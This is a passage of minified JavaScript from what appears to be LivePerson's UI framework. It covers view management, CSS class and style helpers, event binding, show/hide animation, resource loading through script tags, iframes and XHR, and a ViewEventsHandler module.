          targetView: d || this.view,
          viewToAdd: c.view,
          beforeView: a.beforeView
        });
        d = null;
      }
    } else setTimeout(b(this, c), 5);
  };
  e.removeView = function (a) {
    if (a) {
      var b = a.view || a;
      this.isDOMNode(b) && b.parentNode && b.parentNode.removeChild(b);
      b = null;
    }
  };
  e.addView = function (a) {
    if (a.targetView && this.isDOMNode(a.targetView)) {
      var b = a.beforeView && this.isDOMNode(a.beforeView);
      b ? a.targetView.insertBefore(a.viewToAdd, a.beforeView) : a.targetView.appendChild(a.viewToAdd);
      return a.viewToAdd;
    }
    this.logger.error("Wrong view to add [" + a.targetView + "]", "addView");
  };
  e.isDOMNode = function (a) {
    return a && (a.nodeType === this.elementTypes.ELEMENT || a === this.elementTypes.FRAGMENT_DOCUMENT);
  };
  e.removeViewController = function (a) {
    var b = a.viewController || a;
    if (this.viewControllers) for (var c = 0; c < this.viewControllers.length; c++) if (this.viewControllers[c] === b) {
      b.dispose();
      this.viewControllers.splice(c, 1);
      break;
    }
  };
  e.dispose = function () {
    var a;
    this.appContext && this.appContext.events && this.appContext.events.unbind({
      context: this
    });
    if (d.disposePlugins) for (a = 0; a < d.disposePlugins.length; a++) d.disposePlugins[a] && d.disposePlugins[a].call(this);
    this.unbindViewEvent();
    this.viewEventsHandler && this.viewEventsHandler.unbindEvent();
    if (this.viewControllers) {
      for (a = 0; a < this.viewControllers.length; a++) if (this.viewControllers[a]) {
        this.viewControllers[a].dispose();
        this.viewControllers[a] = null;
      }
      this.viewControllers.length = 0;
    }
    if (this.view) {
      this.view.style.display = "none";
      this.view.innerHTML = "";
    }
    this.view && this.view.parentNode && this.view.parentNode.removeChild(this.view);
    for (var b in this) if (this.hasOwnProperty(b)) {
      this[b] = null;
      delete this[b];
    }
  };
  e.elementTypes = {
    ELEMENT: 1,
    ATTRIBUTE: 2,
    TEXT: 3,
    COMMENTS: 8,
    DOCUMENT: 9,
    FRAGMENT_DOCUMENT: 11
  };
  e.ANIMATION_CLASS_PREFIX = "lpViewAnimationClass";
  e.getElements = function (a, b) {
    if ("body" === a) return [document.body];
    var c = this.isDOMNode(b) ? b : this.view;
    if ("" !== a && "string" == typeof a && a.length > 0 && c) {
      a = this.trim(a);
      switch (a.charAt(0)) {
        case "#":
          var d = document.getElementById(a.substring(1));
          if (d) return [d];
          break;
        case ".":
          return this.getElementsByClass(c, a.substring(1), []);
        case "^":
          return c.querySelectorAll('[data-lp-point="{{point}}"]'.replace("{{point}}", a.substring(1)));
        default:
          if (a.indexOf("<") < 0) return c.getElementsByTagName(a);
      }
    }
    return [];
  };
  e.getFirstElement = function (a, b) {
    var c = b || this.view;
    if (!a) return c;
    if (this.isDOMNode(a)) return a;
    var d = this.getElements(a, b);
    return d && !this.isDOMNode(d) && (d.constructor === Array || d.constructor === NodeList || d.constructor === HTMLCollection || d.constructor === window.StaticNodeList || (d instanceof NodeList || d instanceof HTMLCollection) && d[0]) ? d[0] : d;
  };
  e.getElementsByClass = function (a, b, c) {
    if (!a || !this.isDOMNode(a)) return c;
    a && a.className && this.hasSingleClass(a, b) && c.push(a);
    var d;
    d = document.getElementsByClassName ? a.getElementsByClassName(b) : a.querySelectorAll("." + b);
    for (var e = 0; e < d.length; e++) c.push(d[e]);
    return c;
  };
  e.hasAtLeastOneClass = function (a, b, c) {
    for (var d = this.hasClass(a, b, c), e = 0; e < d.length; e++) if (d[e]) return !0;
    return !1;
  };
  e.hasClass = function (a, b, c) {
    b = b.constructor === Array ? b : [b];
    for (var d = [], e = 0; e < b.length; e++) d.push(!1);
    var f = "";
    if (this.isDOMNode(a) && "undefined" != typeof a.className) {
      for (var g, h = a.className.split(" ") || a.className, i = 0; i < h.length; i++) {
        g = !0;
        for (var j = 0; j < b.length; j++) if (b[j] === h[i]) {
          d[j] = !0;
          g = !1;
        }
        c && g && (f += " " + h[i]);
      }
      if (c) {
        f = f.replace(/^\s\s*/, "");
        a.className = f;
      }
    } else this.logger.error("Unable to check 'hasClass' for " + a + " queryClass: " + b + " element.className=" + a.className, "hasClass");
    return d;
  };
  e.hasSingleClass = function (a, b, c) {
    var d = this.hasClass(a, b, c);
    d = 1 === d.length ? d[0] : d;
    return d;
  };
  e.addClassMultiElements = function (a, b) {
    "string" == typeof a && (a = this.getElements(a));
    for (var c = 0; c < a.length; c++) this.addClass(a[c], b);
  };
  e.addElement = function (a, b, c) {
    function d(a) {
      e.appendChild(a);
    }
    var e = this.getElements(b, a);
    e && (this.isDOMNode(c) ? d(c) : this.loadResource(c, d));
  };
  e.addClass = function (a, b, c) {
    "string" == typeof a && (a = this.getFirstElement(a));
    b = b.constructor === Array ? b : [b];
    if (this.isDOMNode(a)) {
      var d = a.className;
      if (d) for (var e = this.hasClass(a, b), f = 0; f < e.length; f++) e[f] === !1 && (d += " " + b[f]);else for (var g = 0; g < b.length; g++) d += b[g] + " ";
      a.className = this.trim(d);
    } else this.logger.error("Unable to add class to " + a + " Class: " + b, "addClass");
    if ("number" == typeof c) {
      var h = this;
      setTimeout(function () {
        h.removeClass(a, b);
      }, c);
    }
  };
  e.removeClassMultiElements = function (a, b, c) {
    "string" == typeof a && (a = this.getElements(a));
    for (var d = 0; d < a.length; d++) this.removeClass(a[d], b, c);
  };
  e.removeClass = function (a, b, c) {
    "string" == typeof a && (a = this.getFirstElement(a));
    if (this.isDOMNode(a)) {
      this.hasClass(a, b, !0);
      if (c && a.hasChildNodes()) {
        for (var d = a.childNodes, e = 0; d.length; e++) this.isDOMNode(d[e]) && this.removeClass(d[e], b, c);
        d = null;
      }
    }
  };
  e.toggleClass = function (a, b, c) {
    "string" == typeof a && (a = this.getFirstElement(a));
    for (var d = a.className.split(" "), e = !1, f = !1, g = 0; g < d.length; g++) if (d[g] === b) {
      c || (f = !0);
      d[g] = c;
    } else d[g] === c && (d[g] = b);
    if (!c && !f) {
      d.push(b);
      e = !0;
    }
    a.className = this.trim(d.join(" "));
    return e;
  };
  e.css = function (a, b, c) {
    for (var d, e, f = a.style.cssText.split(";"), g = {}, h = 0; h < f.length; h++) {
      var i = f[h].split(":");
      d = this.trim(i[0]).toLowerCase();
      if (!c || -1 === window.lpTag.taglets.lpUtil.indexOf(c, d)) {
        e = this.trim(i[1]);
        d && "undefined" == typeof b[d] && (g[d] = e);
      }
    }
    var j = "";
    for (var k in g) g.hasOwnProperty(k) && (j += k + ":" + g[k] + ";");
    for (var l in b) b.hasOwnProperty(l) && (j += l + ":" + b[l] + ";");
    a.style.cssText = j;
  };
  e.getTransitionType = function () {
    e.transitionType || ("" === document.body.style.MozTransition ? e.transitionType = "-moz-transition" : "" === document.body.style.WebkitTransition ? e.transitionType = "-webkit-transition" : "" === document.body.style.OTransition ? e.transitionType = "-o-transition" : e.transitionType = "transition");
    return e.transitionType;
  };
  e.getTransitionDuration = function () {
    e.transitionDuration || ("" === document.body.style.MozTransition ? e.transitionDuration = "-moz-transition-duration" : "" === document.body.style.WebkitTransition ? e.transitionDuration = "-webkit-transition-duration" : "" === document.body.style.OTransition ? e.transitionDuration = "-o-transition-duration" : e.transitionDuration = "transition-duration");
    return e.transitionDuration;
  };
  e.getTransitionEnd = function (a) {
    e.transitionEnd || ("" === document.body.style.MozTransition ? e.transitionEnd = "transitionend" : "" === document.body.style.WebkitTransition ? e.transitionEnd = "webkitTransitionEnd" : "" === document.body.style.OTransition ? e.transitionEnd = "OTransitionEnd" : e.transitionEnd = "transitionend");
    return e.transitionEnd;
  };
  e.setStyle = function (a, b) {
    var c;
    c = "string" == typeof a ? this.getElements(a) : [a];
    for (var d = 0; d < c.length; d++) for (var e in b) b.hasOwnProperty(e) && (c[d].style[e] = b[e]);
  };
  e.getInlineStyle = function (a, c, d) {
    var e;
    "string" == typeof a && (a = this.getFirstElement(a));
    if (!this.isDOMNode(a)) return "";
    e = a.style;
    return b(e, c, d);
  };
  e.getComputedStyle = function (a, c, d) {
    var e = {};
    "string" == typeof a && (a = this.getFirstElement(a));
    if (!this.isDOMNode(a)) return "";
    if (document.defaultView && document.defaultView.getComputedStyle) e = document.defaultView.getComputedStyle(a, "");else if (a.currentStyle) {
      if ("height" === c) return a.offsetHeight;
      e = a.currentStyle;
    } else e = a.style;
    return b(e, c, d);
  };
  e.animate = function (a, b, c) {
    function d(d) {
      for (var e in b) b.hasOwnProperty(e) && "duration" !== e && (a.style[e] = b[e]);
      c && c.call(d);
    }
    function e(d) {
      d.addClass(a, d.ANIMATION_CLASS_PREFIX);
      setTimeout(function () {
        setTimeout(function () {
          d.removeClass(a, d.ANIMATION_CLASS_PREFIX);
          a.style[d.getTransitionDuration()] = "";
          c && setTimeout(function () {
            c.call(d);
          }, 0);
        }, b.duration);
        for (var e in b) b.hasOwnProperty(e) && ("duration" === e ? a.style[d.getTransitionDuration()] = b[e] + "ms" : a.style[e] = b[e]);
      }, 0);
    }
    this.isDOMNode(a) && (this.supportAnimation ? e(this) : d(this));
  };
  e.preventDefault = function (a) {
    a && (a.preventDefault ? a.preventDefault() : a.returnValue = !1);
  };
  e.stopPropagation = function (a) {
    a && (a.stopPropagation ? a.stopPropagation() : a.cancelBubble = !0);
  };
  e.changePosition = function (a, b) {
    if (a && a.style && a.style.position !== b) {
      "string" == typeof a && (a = this.getFirstElement(a));
      var c = this.getElementRect("fixed" === b ? a : a.parentNode),
        d = {
          position: b
        };
      if ("absolute" === b) {
        d.left = parseInt(a.style.left, 10) - c.left + "px";
        d.top = parseInt(a.style.top, 10) - c.top + "px";
      } else {
        d.left = c.left + "px";
        d.top = c.top + "px";
      }
      this.css(a, d);
    }
  };
  e.getElementRect = function (a) {
    function b(a) {
      c += a.offsetLeft;
      d += a.offsetTop;
      a.offsetParent && b(a.offsetParent);
    }
    var c = 0,
      d = 0;
    b(a);
    return {
      top: d,
      bottom: d + a.offsetHeight,
      left: c,
      right: c + a.offsetWidth,
      width: a.offsetWidth,
      height: a.offsetHeight
    };
  };
  e.reflow = function () {
    function a() {
      c.view.style.top = b + "px";
    }
    var b = this.getComputedStyle(this.view, "top", 10),
      c = this;
    b = isNaN(b) ? 0 : b;
    this.view.style.top = b + 1 + "px";
    setTimeout(a, 5);
  };
  e.bindViewEvent = function (a) {
    if (a && a.DOMEvent) {
      this.bindedViewEventsMap || (this.bindedViewEventsMap = []);
      var b,
        c = this.createViewEvent(a);
      b = a.selector && a.selector === window ? [window] : a.view ? [a.view] : a.selector ? this.getElements(a.selector, a.inView) : [this.view];
      for (var d, e, f = 0; f < b.length; f++) {
        e = b[f];
        if (e.addEventListener) {
          d = a.DOMEvent;
          "transition" === d && this.supportTransitions && (d = this.getTransitionEnd(d));
          e.addEventListener(d, c, !1);
        } else if (e.attachEvent) {
          d = a.DOMEvent;
          e.attachEvent("on" + d, c);
        }
        this.bindedViewEventsMap.push({
          view: e,
          DOMEvent: d,
          callback: c,
          originalCallback: a.callback
        });
        e = null;
      }
      e = null;
      d = null;
      b = null;
    }
  };
  e.createViewEvent = function (a) {
    var b = a.context || this;
    return function (c) {
      c = c || event;
      if (a.ignoreChildBlur) {
        var e = a.selector ? b.getFirstElement(a.selector) : b.view;
        if (b.isEventFromChild(c, e, a.includeSelf)) return;
      }
      if (a.callback && "function" == typeof a.callback) {
        c.eventSelector = a.selector;
        try {
          c.sourceElement = c.target || c.relatedTarget || c.srcElement;
          c.eventData = a.eventData;
          c.data = a.data;
          c.lpEventData = a.lpEventData;
          c.context = b;
          a.delayEvent && !isNaN(a.delayEvent) ? setTimeout(function () {
            a.callback.call(b, c);
          }, a.delayEvent) : a.callback.call(b, c);
        } catch (f) {
          b.logger.error(f + " " + c, a);
        }
      }
      a.appName && !c.preventFireUIEvent && d.viewEventsHandler.fireEvent({
        appName: a.appName,
        UIEvent: a.UIEvent || a.DOMEvent,
        eventData: a.eventData || a.lpEventData || a.data
      });
    };
  };
  e.isEventFromChild = function (a, b, c) {
    var d = !1;
    c = "boolean" == typeof c ? c : !0;
    if ("focusout" === a.type && (a.relatedTarget || a.toElement)) {
      var e = a.toElement || a.relatedTarget,
        f = a.target || a.srcElement,
        g = b.contains(e);
      d = c ? g || f === e : g && f !== e;
    }
    return d;
  };
  e.getViewEvent = function (a) {
    if (this.bindedViewEventsMap) {
      for (var b, c = 0; c < this.bindedViewEventsMap.length; c++) {
        var d = this.bindedViewEventsMap[c];
        if (d && d.view === a.view && d.DOMEvent === a.DOMEvent && (a.callback === d.callback || a.callback === d.originalCallback)) {
          b = d;
          b.index = c;
          return b;
        }
      }
      return b;
    }
  };
  e.unbindViewEvent = function (a) {
    function b(a, b, c) {
      try {
        if (a && a.view) {
          window.removeEventListener ? a.view.removeEventListener(a.DOMEvent, a.callback, !1) : window.detachEvent && a.view.detachEvent("on" + a.DOMEvent, a.callback);
          if (b[a.index]) {
            b[a.index] = null;
            b.splice(a.index, 1);
          }
        }
      } catch (d) {
        c.error(d + " " + d.message, "unbindSingleViewEvent");
      }
    }
    var c = a || this.bindedViewEventsMap || [];
    c = c.constructor === Array ? c : [c];
    for (var d, e, f = 0; f < c.length; f++) {
      d = c[f];
      if (d && d.selector) {
        e = this.getElements(d.selector, d.inView);
        for (var g = 0; g < e.length; g++) b(this.getViewEvent({
          view: e[f],
          DOMEvent: d.DOMEvent,
          callback: d.callback
        }), this.bindedViewEventsMap, this.logger);
      } else b(this.getViewEvent(d), this.bindedViewEventsMap, this.logger);
    }
    e = null;
    d = null;
    c = null;
  };
  e.isVisible = function (a) {
    var b = a;
    "string" == typeof a && (b = this.getFirstElement(a));
    return this.isDOMNode(b) ? !("none" === this.getComputedStyle(b, "display") || "none" === b.style.display) : !1;
  };
  e.toggle = function (a, b, c, d) {
    a ? this.show(b, c, d) : this.hide(b, c, d);
  };
  e.lpHide = function (a, b, c) {
    this.hide(a, b, c);
  };
  e.hide = function (a, b, c) {
    var d;
    if ("object" == typeof a && !this.isDOMNode(a)) {
      var e = a || {};
      b = e.parentScope;
      c = e.animate;
      a = e.view;
      d = e.useClasses;
    }
    a && a != this.view || (this.visible = !1);
    var f = a || this.view;
    b && (b = "string" == typeof b ? this.getFirstElement(b) : b);
    "string" == typeof f && (f = this.getFirstElement(f, b));
    if (this.isDOMNode(f)) {
      if (c) {
        var g = this;
        this.animate(f, {
          duration: 250,
          opacity: 0
        }, function () {
          d ? g.addClass(f, "lpHide") : f.style.display = "none";
          f = null;
        });
      } else d ? this.addClass(f, "lpHide") : f.style.display = "none";
    } else this.logger.error("Received viewToHide which is not a view or string - " + a, "lpHide");
  };
  e.focus = function (a) {
    if (a) {
      "string" == typeof a && (a = this.getFirstElement(a));
      var b = parseInt(this.getComputedStyle(a, "height"), 10);
      b && a.focus();
      a = null;
    }
  };
  e.lpShow = function (a, b, c) {
    this.show(a, b, c);
  };
  e.show = function (a, b, c) {
    var d, e;
    if ("object" == typeof a && !this.isDOMNode(a)) {
      var f = a || {};
      b = f.parentScope;
      c = f.animate;
      a = f.view;
      d = f.useClasses;
      f.display && (e = f.display);
    }
    a && a !== this.view || (this.visible = !0);
    var g = a || this.view;
    b && (b = "string" == typeof b ? this.getFirstElement(b) : b);
    "string" == typeof a && (g = this.getFirstElement(g, b));
    if (this.isDOMNode(g)) {
      if (c) {
        g.style.opacity = 0;
        if (d) {
          this.removeClass(g, "lpHide");
          e && (g.style.display = e);
        } else g.style.display = "block";
        this.animate(g, {
          duration: 250,
          opacity: 1
        });
      } else if (d) {
        this.removeClass(g, "lpHide");
        e && (g.style.display = e);
      } else g.style.display = "block";
    } else this.logger.error("Received viewToShow which is not a view or string - " + a, "lpShow");
    g = null;
  };
  e.setEnabled = function (a, b) {
    var c = this.getFirstElement(b || this.view);
    a ? c.disabled = null : c.disabled = "disabled";
  };
  e.loadMultiResource = function (a, b, c) {
    function d(g) {
      f++;
      e.push(g);
      f < a.length ? this.loadSingleResource(a[f], d, c) : b.call(this, e);
    }
    var e = [],
      f = 0;
    a instanceof Array ? this.loadSingleResource(a[f], d, c) : this.loadSingleResource(a, function (a) {
      b.call(this, [a]);
    }, c);
  };
  e.loadResource = function (a, b, c, d) {
    function e() {
      ++g;
      g != f.length - 1 ? h.loadSingleResource(f[g], e, c) : h.loadSingleResource(f[g], b, c, d);
    }
    if (!(a instanceof Array)) return this.loadSingleResource(a, b, c, d);
    var f = a,
      g = 0,
      h = this;
    this.loadSingleResource(f[g], e, c);
  };
  e.loadSingleResource = function (b, c, d, f) {
    function g(a, b, c) {
      var d = document.createElement("script");
      d.setAttribute("type", "text/javascript");
      d.async = !0;
      b && (d.onload = b);
      c && (d.onerror = c);
      d.setAttribute("src", "" + a);
    }
    function h(a, b) {
      return function (c) {
        b.call(a, c);
      };
    }
    function i(b, c, d) {
      var e;
      e = d && d.cssLocation ? d.cssLocation : b.configuration && b.configuration.cssLocation ? b.configuration.cssLocation : a.configuration && a.configuration.cssLocation;
      if (e) {
        var f = document.createElement("link");
        f.setAttribute("rel", "stylesheet");
        f.setAttribute("type", "text/css");
        f.setAttribute("href", e + c);
        "undefined" != typeof f && document.getElementsByTagName("head")[0].appendChild(f);
      }
    }
    function j(b, c, d, f) {
      var g,
        h = e.resourceCache,
        i = e;
      g = f && f.htmlLocation ? f.htmlLocation : b.configuration && b.configuration.htmlLocation ? b.configuration.htmlLocation : a.configuration && a.configuration.htmlLocation;
      var j = m(g, window.location.href),
        o = !(!g || j || !window.addEventListener);
      if (o) {
        var p = n(g);
        if (!i.loadingResourceFrame[p]) {
          var q = document.createElement("iframe");
          i.loadingResourceFrame[p] = {
            frame: q
          };
          q.style.position = "fixed";
          q.style.top = "-1000px";
          q.style.left = "-1000px";
          q.style.width = "1px";
          q.style.height = "1px";
          q.src = g + "loadResource.html";
          var r = 0;
          for (var s in i.loadingResourceFrame) i.loadingResourceFrame.hasOwnProperty(s) && r++;
          1 === r && window.addEventListener("message", l, !1);
          document.body.appendChild(q);
        }
        i.pendingRequests.push({
          filename: c,
          context: b,
          callback: d,
          location: g
        });
        k();
      } else {
        var t = new XMLHttpRequest();
        t.open("GET", (g || "") + c, !1);
        t.send(null);
        h[c] = t.responseText;
        d.call(b, h[c]);
      }
    }
    function k() {
      var a,
        b = e;
      if (!b.pendingResponse && b.pendingRequests.length > 0) {
        var c = n(b.pendingRequests[0].location);
        if (b.loadingResourceFrame[c].iframeLoaded) {
          a = b.pendingRequests.shift();
          if (b.resourceCache[a.filename]) {
            a.callback.call(a.context, b.resourceCache[a.filename]);
            k();
          } else {
            b.loadingResourceFrame[c].frame.contentWindow.postMessage(a.filename, "*");
            b.pendingResponse = a;
          }
        }
      }
    }
    function l(a) {
      if (a.data && 0 === a.data.indexOf("uiframework_load")) {
        var b = e;
        b.loadingResourceFrame[a.origin].iframeLoaded = !0;
        var c, d;
        if (a && a.data && a.data.indexOf(":") >= 0) {
          d = a.data.substring(a.data.indexOf(":") + 1);
          if (d) {
            c = a.data.substring("uiframework_load".length, a.data.indexOf(":"));
            b.resourceCache[c] = d;
            b.pendingResponse.callback.call(b.pendingResponse.context, b.resourceCache[c]);
            b.pendingResponse = null;
            delete b.pendingResponse;
          }
        }
        k();
      }
    }
    function m(a, b) {
      if (!a || 0 !== a.indexOf("http")) return !0;
      var c = n(a),
        d = n(b);
      return c === d;
    }
    function n(a) {
      var b = new RegExp(/(http{1}s{0,1}?:\/\/){0,1}([^\/\?]+)(\/?)/gi),
        c = b.exec(a),
        d = null;
      c && c.length >= 3 && "" !== c[2] && (d = c[1] + c[2].toLowerCase());
      return d;
    }
    if ("undefined" == typeof b || b.indexOf("{") >= 0 || b.indexOf("<") >= 0) {
      c && "function" == typeof c && c.call(this, b);
      return b;
    }
    var o = this.resourceCache || e.resourceCache;
    if (o[b]) {
      c && "function" == typeof c && c.call(this, o[b]);
      return o[b];
    }
    var p = b.split("."),
      q = p[p.length - 1];
    switch (q) {
      case "js":
        g(b, h(this, c), h(this, d));
        break;
      case "css":
        i(this, b, f);
        break;
      case "html":
        j(this, b, c, f);
    }
    return null;
  };
  e.trim = function (a) {
    return a ? a.trim ? a.trim() : a.replace(/^\s+|\s+$/gm, "") : a;
  };
}(createFrameworkGlobals());
!function () {
  var a = .8;
  window.liveperson = window.liveperson || {};
  window.liveperson.uiframework = window.liveperson.uiframework || {};
  window.liveperson.uiframework.latest = window.liveperson.uiframework.latest || {};
  var b = window.liveperson.uiframework;
  b["v" + a] = b["v" + a] || {};
  b = b["v" + a];
  if (!b.ViewEventsHandler) {
    b.ViewEventsHandler = function (a) {
      var c = {
          focus: this.eventType.VISITOR_FOCUSED,
          blur: this.eventType.VISITOR_BLURRED
        },
        d = {},
        e = new b.LPModel(null, a);
      this.bindEvent = function (a) {
        d[a.appName] || (d[a.appName] = {});
        d[a.appName][a.UIEvent] = !0;
        e.bind(a.appName + "_" + a.UIEvent, a.callback, a.context);
      };
      this.unbindEvent = function (a) {
        var b = a.callback || null,
          c = a.context || null,
          f = null;
        if (a.appName) {
          f = a.appName;
          if (a.UIEvent) f = a.appName + "_" + a.UIEvent;else for (var g in d[a.appName]) if (d[a.appName].hasOwnProperty(g)) {
            var h = {
              appName: a.appName,
              UIEvent: g,
              context: c,
              callback: b
            };
            this.unbindEvent(h);
          }
        }
        e.unbind(f, b, c);
      };
      this.fireEvent = function (a) {
        var b = {
          timeStamp: new Date().getTime(),
          appName: a.appName,
          UIEvent: a.UIEvent
        };
        a.eventData && (b.eventData = a.eventData);
        a.lpEventData && (b.lpEventData = a.lpEventData);
        a.data && (b.data = a.data);
        if (a.UIEvent === c.focus || a.UIEvent === c.blur) {
          var d = a.appName + "_" + (a.UIEvent === c.focus ? c.blur : c.focus);
          e.get(d) && e.removeKey(d, !1);
        }
        e.modify(a.appName + "_" + a.UIEvent, b);
        (a.deleteOnFire || a.runOnce) && e.removeKey(a.appName + "_" + a.UIEvent, !1);
      };
    };
    b.ViewEventsHandler.prototype.eventType = {};
    b.ViewEventsHandler.version = a;
    (!window.liveperson.uiframework.latest.ViewEventsHandler || window.liveperson.uiframework.latest.ViewEventsHandler.version < a) && (window.liveperson.uiframework.latest.ViewEventsHandler = b.ViewEventsHandler);
  }
}();